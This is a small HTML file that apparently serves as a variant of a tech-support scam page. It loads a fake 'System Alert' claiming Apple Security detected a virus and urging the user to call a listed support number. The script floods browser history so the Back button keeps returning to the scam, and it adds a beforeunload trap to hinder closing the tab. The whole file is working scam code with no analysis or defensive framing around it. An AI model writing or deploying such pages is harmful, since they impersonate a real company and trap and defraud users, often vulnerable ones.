<!DOCTYPE html>
<!-- Variant (extra trap layer): no key blocking at all; instead floods history so Back keeps landing on the scam, plus an unload trap. -->
<html lang="en"><head><meta charset="utf-8"><title>Loading</title></head>
<body>
<script>
  const html = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>System Alert</title></head>
  <body style="font-family:Arial;text-align:center;padding-top:80px">
  <h1>Your computer has been locked</h1><p>Apple Security detected a virus. Call Apple Support now: 1-877-555-0111</p>
  <script>
    for (let i = 0; i < 20; i++) history.pushState({ i }, '');
    window.addEventListener('beforeunload', e => { e.preventDefault(); e.returnValue = ''; });
  <\/script></body></html>`;
  location.href = URL.createObjectURL(new Blob([html], { type: 'text/html' }));
</script></body></html>
